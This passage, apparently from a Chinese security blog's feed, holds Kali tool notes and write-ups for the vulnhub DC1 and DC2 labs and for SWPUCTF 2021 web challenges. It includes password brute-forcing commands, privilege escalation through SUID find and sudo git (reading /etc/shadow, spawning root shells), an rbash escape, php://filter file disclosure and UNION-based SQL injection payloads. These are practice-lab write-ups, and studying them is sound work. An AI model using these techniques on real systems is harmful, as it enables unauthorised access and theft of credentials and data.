class="line">db_nmap -sV -p <span class="number">80</span>,<span class="number">443</span>,<span class="number">445</span> <span class="number">192.168</span>.<span class="number">1.0</span>/<span class="number">24</span></span><br><span class="line"><span class="comment"># 扫描 192.168.1.0/24 网络的 80, 443, 445 端口，并保存结果到数据库</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 13. 退出 Metasploit</span></span><br><span class="line"><span class="keyword">exit</span></span><br><span class="line"><span class="comment"># 退出 msfconsole</span></span><br></pre></td></tr></table></figure></div>

<h2 id="Cewl"><a href="#Cewl" class="headerlink" title="Cewl"></a>Cewl</h2><p>Cewl 是一个爬虫工具，可以抓取网站内容并生成密码字典。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">cewl -w <span class="tag">&lt;<span class="name">输出文件</span>&gt;</span> -d <span class="tag">&lt;<span class="name">深度</span>&gt;</span> <span class="tag">&lt;<span class="name">URL</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="fcrackzip"><a href="#fcrackzip" class="headerlink" title="fcrackzip"></a>fcrackzip</h2><p>使用frackzip破解压缩包</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">fcrackzip</span> -b -c <span class="number">1</span> -l <span class="number">1</span>-<span class="number">6</span> -p <span class="number">0</span> -u <span class="number">1</span>.zip</span><br></pre></td></tr></table></figure></div>
<p>-b：使用暴力破解模式。</p>
<p>-c 1：限制密码仅包含数字字符。</p>
<p>-l 1-6：限制密码长度在 1 到 6 个字符之间。</p>
<p>-p 0：初始化破解起点为 0。</p>
<p>-u：显示破解出来的密码。</p>
<h2 id="hydra"><a href="#hydra" class="headerlink" title="hydra"></a>hydra</h2><p>Hydra 是一个多协议暴力破解工具。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">hydra -L <span class="tag">&lt;<span class="name">用户名列表</span>&gt;</span> -P <span class="tag">&lt;<span class="name">密码列表</span>&gt;</span> <span class="tag">&lt;<span class="name">协议</span>&gt;</span>://<span class="tag">&lt;<span class="name">目标</span>&gt;</span>:<span class="tag">&lt;<span class="name">端口</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>支持 SSH、FTP、HTTP 等协议。</p>
<h3 id="常用参数-5"><a href="#常用参数-5" class="headerlink" title="常用参数"></a>常用参数</h3><table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>-L &lt;文件&gt;</code></td>
<td>指定包含多个用户名的文件。</td>
</tr>
<tr>
<td><code>-l &lt;用户名&gt;</code></td>
<td>指定单个用户名。</td>
</tr>
<tr>
<td><code>-P &lt;文件&gt;</code></td>
<td>指定包含多个密码的文件。</td>
</tr>
<tr>
<td><code>-p &lt;密码&gt;</code></td>
<td>指定单个密码。</td>
</tr>
<tr>
<td><code>-t &lt;线程数&gt;</code></td>
<td>指定线程数，默认为16。可以增加来提高破解速度，但过高可能会被目标封禁或造成网络问题。</td>
</tr>
<tr>
<td><code>-o &lt;文件&gt;</code></td>
<td>将破解成功的结果保存到指定文件中。</td>
</tr>
</tbody></table>
<h2 id="gobuster"><a href="#gobuster" class="headerlink" title="gobuster"></a>gobuster</h2><p><code>gobuster</code> 是一个用 Go 语言编写的目录 &#x2F; 文件扫描工具，常用于渗透测试和安全审计中，目的是通过暴力破解或字典攻击来发现 Web 服务器上的隐藏目录和文件。<br><code>gobuster dir -u http://example.com -w /path/to/wordlist.txt</code><br>默认字典目录在<code>/usr/share/wordlists/dirbuster/</code> 下<br>-s 指定要显示的http状态码   -t指定线程 一般用50 60 -b 排除状态码<br>字典位置：&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;<br><img src="https://pic1.imgdb.cn/item/679b3f5ed0e0a243d4f8ac2d.png"><br>一般是dirsearch没有发现有用的内容的时候用这个扫描器  用这个 medium字典</p>
<h2 id="Enum4Linux"><a href="#Enum4Linux" class="headerlink" title="Enum4Linux"></a>Enum4Linux</h2><p><strong><code>enum4linux</code></strong> 是一款用于 Linux 系统上的 SMB（Server Message Block）协议枚举工具，常用于网络安全测试中进行 Windows 系统的枚举。它能够帮助渗透测试人员获取有关 Windows 系统的详细信息，例如共享资源、用户账户、操作系统版本、域名等。<br>功能和smbmap差不多</p>
<h3 id="常用参数和示例"><a href="#常用参数和示例" class="headerlink" title="常用参数和示例"></a>常用参数和示例</h3><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>enum4linux -S &lt;target_ip&gt;</code></td>
<td>列出目标系统的共享资源。</td>
</tr>
<tr>
<td><code>smbmap -H &lt;target_ip&gt;</code></td>
<td>列出目标系统的共享资源（替代 <code>enum4linux -S</code>）。</td>
</tr>
<tr>
<td><code>enum4linux -O &lt;target_ip&gt;</code></td>
<td>获取目标 Windows 系统的操作系统版本。</td>
</tr>
<tr>
<td><code>enum4linux -U &lt;target_ip&gt;</code></td>
<td>列出目标计算机上的所有用户账户。</td>
</tr>
<tr>
<td><code>enum4linux -P &lt;target_ip&gt;</code></td>
<td>获取目标主机上用户的登录历史信息。</td>
</tr>
<tr>
<td><code>enum4linux -A &lt;target_ip&gt;</code></td>
<td>请求更多的枚举信息，包括共享、用户等数据。</td>
</tr>
<tr>
<td><code>enum4linux -G &lt;target_ip&gt;</code></td>
<td>获取目标系统上组的相关信息。</td>
</tr>
</tbody></table>
<h2 id="stegseek"><a href="#stegseek" class="headerlink" title="stegseek"></a>stegseek</h2><p>Stegseek 是一款快速的 <strong>JPEG 隐写分析工具</strong>，专门用于破解 <code>steghide</code> 隐写的图片文件。它可以 <strong>高效爆破密码</strong>，并提取隐藏数据。</p>
<p>Stegseek 主要功能包括：</p>
<ul>
<li><p><strong>快速爆破密码</strong>：基于字典的攻击，速度极快。</p>
</li>
<li><p><strong>提取隐藏数据</strong>：无需密码时，尝试默认密码或空密码提取。</p>
</li>
<li><p><strong>检查图片是否含有隐写数据</strong>。</p>
</li>
</ul>
<h3 id="常用参数-6"><a href="#常用参数-6" class="headerlink" title="常用参数"></a>常用参数</h3><table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>-sf</code>, <code>--stegofile</code></td>
<td>选择隐写文件</td>
</tr>
<tr>
<td><code>-wl</code>, <code>--wordlist</code></td>
<td>选择密码字典文件，用于暴力破解</td>
</tr>
<tr>
<td><code>-xf</code>, <code>--extractfile</code></td>
<td>指定提取数据时的文件名</td>
</tr>
<tr>
<td><code>-t</code>, <code>--threads</code></td>
<td>设定线程数量，默认为 CPU 核心数</td>
</tr>
<tr>
<td><code>-f</code>, <code>--force</code></td>
<td>强制覆盖已存在的文件</td>
</tr>
<tr>
<td><code>-v</code>, <code>--verbose</code></td>
<td>显示详细信息</td>
</tr>
<tr>
<td><code>-q</code>, <code>--quiet</code></td>
<td>隐藏性能指标（可能提升性能）</td>
</tr>
<tr>
<td><code>-s</code>, <code>--skipdefault</code></td>
<td>不使用默认猜测（如空密码、文件名等）</td>
</tr>
<tr>
<td><code>-n</code>, <code>--nocolor</code></td>
<td>禁用终端输出的颜色</td>
</tr>
<tr>
<td><code>-c</code>, <code>--continue</code></td>
<td>在找到结果后继续破解（可能存在多个嵌入文件）</td>
</tr>
<tr>
<td><code>-a</code>, <code>--accessible</code></td>
<td>简化输出，使其更适用于屏幕阅读器</td>
</tr>
</tbody></table>
<p>一般指定rockyou字典就可以</p>
<h2 id="tcpdump"><a href="#tcpdump" class="headerlink" title="tcpdump"></a>tcpdump</h2><p> <code>tcpdump</code> 是 Linux 和 macOS 上的<strong>网络抓包工具</strong>，用于<strong>抓取、分析和过滤网络数据包</strong>，类似于 Wireshark 的命令行版本。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line">tcpdump -<span class="selector-tag">A</span> -n icmp</span><br></pre></td></tr></table></figure></div>
<p><strong>这个命令的作用是：</strong><br>👉 <strong>监听 ICMP（Internet Control Message Protocol）流量</strong>，比如 <code>ping</code> 请求和回复，并以 <strong>ASCII 方式显示数据包内容</strong>。<br>-A  以 <strong>ASCII 格式</strong> 显示数据包内容，方便阅读（适用于明文协议）<br>-n <strong>不解析 DNS</strong>，直接显示 IP 地址（加快速度）<br>icmp 只抓取 <strong>ICMP</strong> 流量，比如 <code>ping</code> 请求和响应</p>
<h2 id="medusa"><a href="#medusa" class="headerlink" title="medusa"></a>medusa</h2><p><code>medusa</code> 是另一个快速且并行的登录爆破工具。</p>
<h3 id="常用参数-7"><a href="#常用参数-7" class="headerlink" title="常用参数"></a>常用参数</h3><table>
<thead>
<tr>
<th>选项</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>-h &lt;目标主机&gt;</code></td>
<td>指定目标 IP 或主机名（可以用 <code>-H</code> 传入包含多个目标的文件）。</td>
</tr>
<tr>
<td><code>-u &lt;用户名&gt;</code></td>
<td>指定单个用户名。</td>
</tr>
<tr>
<td><code>-U &lt;用户名文件&gt;</code></td>
<td>指定用户名列表文件。</td>
</tr>
<tr>
<td><code>-p &lt;密码&gt;</code></td>
<td>指定单个密码。</td>
</tr>
<tr>
<td><code>-P &lt;密码文件&gt;</code></td>
<td>指定密码列表文件。</td>
</tr>
<tr>
<td><code>-M &lt;服务&gt;</code></td>
<td>指定要攻击的服务，如 <code>ssh</code>、<code>ftp</code>、<code>http</code> 等。</td>
</tr>
<tr>
<td><code>-t &lt;线程数&gt;</code></td>
<td>指定并发线程数，提高爆破效率。</td>
</tr>
<tr>
<td><code>-n &lt;端口号&gt;</code></td>
<td>指定目标服务的端口号（如果默认端口不同）。</td>
</tr>
<tr>
<td><code>-f</code></td>
<td>找到有效凭据后立即停止攻击（可选）。</td>
</tr>
<tr>
<td><code>-v</code> &#x2F; <code>-V</code></td>
<td>设置输出详细程度。</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>linux</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>linux</tag>
        <tag>操作系统</tag>
        <tag>kali</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>DC1靶场复盘</title>
    <url>/posts/52872.html</url>
    <content><![CDATA[<p>vulnhub-DC1靶场复盘</p>
<span id="more"></span>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="https://pic1.imgdb.cn/item/679a2905d0e0a243d4f8771d.png" alt="|500"><br>这个靶机用的是drupal    还可以下载droopescan扫描器   网上教程是用pip3安装但是我的版本无法用这个安装 需要下载pipx 并且要用bash <code>pipx ensurepath</code>  用虚拟环境 来运行<code>python3 -m venv droopescan-env; source droopescan-env/bin/activate</code></p>
<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p>用 wapp可以得到drupal的版本号<br><img src="https://pic1.imgdb.cn/item/679a2948d0e0a243d4f87727.png" alt="|375">&#96;<br>用searchsploit查看druptal的漏洞<br><img src="https://pic1.imgdb.cn/item/679a2909d0e0a243d4f8771e.png"><br>这里利用这个add admin的脚本 -t -u -p 添加一个管理员账户<br>接着仿照以前的经验 下载php插件   在文章中插入php 代码 拿到webshell<br><img src="https://pic1.imgdb.cn/item/679a290ad0e0a243d4f8771f.png"><br><img src="https://pic1.imgdb.cn/item/679a290dd0e0a243d4f87721.png" alt="|500"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查看suid<br><img src="https://pic1.imgdb.cn/item/679a290cd0e0a243d4f87720.png"><br>发现find指令有suid   所以可以利用find  后面执行一个命令 比如我们用 -exec cat &#x2F;etc&#x2F;shadow \; 看  后面要加反斜杠和封号告诉find后面不用再解析命令了   这样可以用root执行命令 拿到flag<br>法二：拿到flag4用户的hash之后 用john破解 登录到flag4用户  用find提权<br><mark>find提权</mark> -exec ‘&#x2F;bin&#x2F;sh’ \;  解决</p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>vulnhub</tag>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>DC2靶场复盘</title>
    <url>/posts/3469.html</url>
    <content><![CDATA[<p>vulnhub-DC2靶场复盘</p>
<span id="more"></span>
<p>先根据提示 修改host</p>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="https://pic1.imgdb.cn/item/679a2562d0e0a243d4f876b9.png" alt="|275"><br>扫描的结果显示只有一个80端口 但是实际上有一个ssh端口 用-p-扫描所有端口  7744</p>
<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p><img src="https://pic1.imgdb.cn/item/679a2563d0e0a243d4f876ba.png" alt="|900"><br>页面上有一个flag提示要用到cewl扫描 然后用扫描出来的内容当作爆破的字典 <code>cewl -w pass.txt http://dc-2/</code><br>这个是一个wordpress cms   我们可以用wpscan扫一下用户名<br><code>wpscan --url http://dc-2/ --enumerate u</code><br>得到两个用户名 tom和jerry<br>然后用bp爆破  得到两个账户  我们分别登录到这两个账户<br><img src="https://pic1.imgdb.cn/item/679a2565d0e0a243d4f876bb.png" alt="|725"><br><img src="https://pic1.imgdb.cn/item/679a2566d0e0a243d4f876bc.png" alt="|925"><br><img src="https://pic1.imgdb.cn/item/679a2566d0e0a243d4f876bd.png" alt="|500"><br>找到了flag2 我们用ssh 登录 这个flag 在jerry账户找到的 用tom登录ssh<br><img src="https://pic1.imgdb.cn/item/679a25b3d0e0a243d4f876c4.png" alt="|475"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="https://pic1.imgdb.cn/item/679a25b4d0e0a243d4f876c5.png"><br>发现了不是普通bash 是rbash  命令受限制<br><img src="https://pic1.imgdb.cn/item/679a25b5d0e0a243d4f876c6.png"><br>查看可以执行的命令<br>这里我们用vi逃逸 : 进入vi之后输入 :set shell&#x3D;&#x2F;bin&#x2F;bash :shell  再修改一下环境 export PATH&#x3D;’&#x2F;usr&#x2F;bin:&#x2F;bin’<br> 执行 <code>cat /etc/passwd</code> 可以看到还有一个jerry 的账户 我们用su切换到jerry<br> 发现jerry可以用root权限执行 git  现在用git提权<br> <img src="https://pic1.imgdb.cn/item/679a25b7d0e0a243d4f876c7.png"><br> <code>sudo git help config !/bin/bash #输入!/bin/bash，即可打开一个用户为root的shell</code> </p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>vulnhub</tag>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>SWPUCTF_2021新生赛(web)WP</title>
    <url>/posts/25446.html</url>
    <content><![CDATA[<p>SWPUCTF_2021新生赛web方向wp</p>
<span id="more"></span>
<p>做题平台:<a href="https://www.nssctf.cn/problem">nssctf</a></p>
<h1 id="gift-F12"><a href="#gift-F12" class="headerlink" title="gift_F12"></a>gift_F12</h1><p>打开题目后，查看源代码就有flag</p>
<h1 id="jicao"><a href="#jicao" class="headerlink" title="jicao"></a>jicao</h1><p>题目：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$json</span>=<span class="title function_ invoke__">json_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;json&#x27;</span>],<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$id</span>==<span class="string">&quot;wllmNB&quot;</span>&amp;&amp;<span class="variable">$json</span>[<span class="string">&#x27;x&#x27;</span>]==<span class="string">&quot;wllm&quot;</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span> <span class="variable">$flag</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>根据代码中的逻辑，如果POST请求的<code>id</code>参数是<code>wllmNB</code>，并且以GET请求的json参数的x的值是<code>wllm</code>的时候输出flag，所以用hackbar修改<br><img src="https://pic1.imgdb.cn/item/67ae0589d0e0a243d4fef380.png"></p>
<h1 id="easy-md5"><a href="#easy-md5" class="headerlink" title="easy_md5"></a>easy_md5</h1><p>题目：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"> <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"> <span class="keyword">include</span> <span class="string">&#x27;flag2.php&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$name</span> != <span class="variable">$password</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$name</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;wrong!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;wrong!&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">wrong!</span><br></pre></td></tr></table></figure></div>
<p>这里用GET请求接受<code>name</code>,POST请求接受<code>password</code>，如果这两个的值不一样，但是md5一样，就输出flag。<br>在php中，数据如果以<code>0e</code>开头会被视为是科学计数法，而且是0 * 10 <sup>n</sup> &#x3D; 0, 所以<mark>只要是md5值以0e开头就会被当作md5相等</mark>，这里给出几个常见的md5开头是0e的字符串。有的题目还会多一层限制，比如一个是纯数字等。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line">   <span class="built_in">md5</span>(<span class="string">&#x27;240610708&#x27;</span>) = <span class="number">0</span>e462097431906509019562988736854</span><br><span class="line">   <span class="built_in">md5</span>(<span class="string">&#x27;QNKCDZO&#x27;</span>) = <span class="number">0</span>e830400451993494058024219903391</span><br><span class="line"><span class="function"><span class="title">md5</span><span class="params">(<span class="string">&#x27;aabg7XSs&#x27;</span>)</span></span> = <span class="number">0</span>e087386482136013740957780965295</span><br><span class="line"><span class="function"><span class="title">md5</span><span class="params">(<span class="string">&#x27;aabC9RqS&#x27;</span>)</span></span> = <span class="number">0</span>e260421314791580664869894734725  </span><br></pre></td></tr></table></figure></div>
<p>用hackbar上传，得到flag<br><img src="https://pic1.imgdb.cn/item/67ae07b9d0e0a243d4fef3cf.png"></p>
<h1 id="include"><a href="#include" class="headerlink" title="include"></a>include</h1><p>题目： </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APPLESCRIPT"><figure class="iseeu highlight /applescript"><table><tr><td class="code"><pre><span class="line">传入一个<span class="built_in">file</span>试试</span><br></pre></td></tr></table></figure></div>
<p>先在url中输入<code>?file=1</code> , 得到源代码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;allow_url_include&quot;</span>,<span class="string">&quot;on&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: text/html; charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;flag 在flag.php中&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;传入一个file试试&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span> flag 在flag.php中</span><br></pre></td></tr></table></figure></div>
<p>这里因为用了include_once这个函数<br>include_once会尝试包含 $file 参数指定的文件。include_once 的作用是确保同一个文件在执行过程中只被包含一次<br>我们利用php伪协议读取文件<br><code>php://filter/convert.base64-encode/source=flag.php</code><br>这里是指定要应用的过滤器filter是base64，将文件通过base64转换之后输出，这样子可以让php不被解析执行，在有些时候也会绕过某些限制。这个经常用到需要熟记。<br>其他的一些php伪协议：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STATA"><figure class="iseeu highlight /stata"><table><tr><td class="code"><pre><span class="line">1）<span class="keyword">file</span>:<span class="comment">// 访问本地文件系统</span></span><br><span class="line">2）http:<span class="comment">// 访问 HTTP (S) 网址</span></span><br><span class="line">3）ftp:<span class="comment">// 访问 FTP (S) URL</span></span><br><span class="line">4) php:<span class="comment">// 访问各个输出输入流</span></span><br><span class="line">5) zlib:<span class="comment">// 处理压缩流</span></span><br><span class="line">6) data:<span class="comment">// 读取数据</span></span><br><span class="line">7) <span class="keyword">glob</span>:<span class="comment">// 查找匹配的文件路径模式</span></span><br><span class="line">8) phar:<span class="comment">// PHP 归档</span></span><br><span class="line">9) rar:<span class="comment">// RAR 数据压缩</span></span><br></pre></td></tr></table></figure></div>
<p>本题payload:<code>?file=php://filter/convert.base64-encode/source=flag.php</code><br><img src="https://pic1.imgdb.cn/item/67ae0b3ed0e0a243d4fef4b7.png"><br>再用一个base64解码就可以（可以用hackbar，也可以随便找个解密网站）<br><img src="https://pic1.imgdb.cn/item/67ae0b93d0e0a243d4fef4c1.png"></p>
<h1 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h1><p>封面是一张杰哥hhhh，然后提示输入点东西，这个标签页的标题提醒<code>参数是wllm</code><br>先试试有没有错误回显，发现是有的</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SMALI"><figure class="iseeu highlight /smali"><table><tr><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28899/?wllm=-1&#x27;</span><br><span class="line"></span><br><span class="line">You have an error in your SQ<span class="class">L syntax;</span><span class="built_in"> check </span>the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;&#x27;-1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure></div>
<p>这里我直接输入<code>?wllm=1&#39; or 1=1 order by 1#</code>还是这个错误提醒，这是是因为用#这个注释符在这题不适用<br>在本题中用的注释是<code>--+</code><br>sql中的注释符：<code>--</code>单行注释符 ， 后面要加空格<br>             <code>#</code>  mysql注释符，只在mysql中<br>             <code>/**/</code> 多行注释符<br>这里在<code>--</code>后面用<code>+</code>是因为这里空格在url中会被url编码，所以用<code>+</code>代替空格</p>
<ol>
<li>查字段</li>
</ol>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">wllm</span>=1&#x27; <span class="keyword">or</span> <span class="attribute">1</span>=1 order by 2 --+</span><br><span class="line"></span><br><span class="line">Your Login name:xxx</span><br><span class="line">Your Password:yyy</span><br><span class="line"></span><br><span class="line">?<span class="attribute">wllm</span>=1&#x27; <span class="keyword">or</span> <span class="attribute">1</span>=1 order by 4 --+</span><br><span class="line">Unknown column <span class="string">&#x27;4&#x27;</span> <span class="keyword">in</span> <span class="string">&#x27;order clause&#x27;</span></span><br></pre></td></tr></table></figure></div>
<p>说明一共有三个字段<br>2. 查回显</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ADA"><figure class="iseeu highlight /ada"><table><tr><td class="code"><pre><span class="line">?wllm=-<span class="number">1</span>&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="comment">--+</span></span><br><span class="line">Your Login name:<span class="number">2</span></span><br><span class="line">Your Password:<span class="number">3</span></span><br></pre></td></tr></table></figure></div>
<p>说明name在第二列 ， password在第三列<br>3. 爆库</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">?wllm=-1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>(),<span class="number">3</span> --+</span><br><span class="line">Your Login name:test_db</span><br><span class="line">Your <span class="keyword">Password</span>:<span class="number">3</span></span><br></pre></td></tr></table></figure>
<p>得到数据库名<code>test_db</code><br>4. 爆表</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="Q"><figure class="iseeu highlight /q"><table><tr><td class="code"><pre><span class="line">?wllm=<span class="number">-1</span>&#x27; <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">where</span> table_schema=database(); --+</span><br><span class="line"></span><br><span class="line">Your Login name:test_tb,users</span><br><span class="line">Your Password:<span class="number">3</span></span><br></pre></td></tr></table></figure></div>
<p>得到表名<code>users</code> <code>test_tb</code><br><code>group_concat</code> 是一个 MySQL 内置的聚合函数，它将查询结果中的多个值连接成一个字符串。<code>table_name</code> 是 <code>information_schema.tables</code> 表中的列，存储了所有表的名字。<br><code>table_schema</code>：表示数据库的名称，即该表属于哪个数据库<br>5. 爆字段</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">?wllm=<span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;; --+</span></span><br><span class="line"><span class="string">Your Login name:USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password</span></span><br><span class="line"><span class="string">Your Password:3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?wllm=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(<span class="built_in">column_name</span>),<span class="number">3</span> <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=<span class="string">&#x27;test_tb&#x27;</span>; <span class="comment">--+</span></span><br><span class="line">Your <span class="keyword">Login</span> <span class="type">name</span>:id,flag</span><br><span class="line">Your <span class="keyword">Password</span>:<span class="number">3</span></span><br></pre></td></tr></table></figure></div>
<p>在<code>test_tb</code>这个数据表里面有flag字段，所以用这个数据表</p>
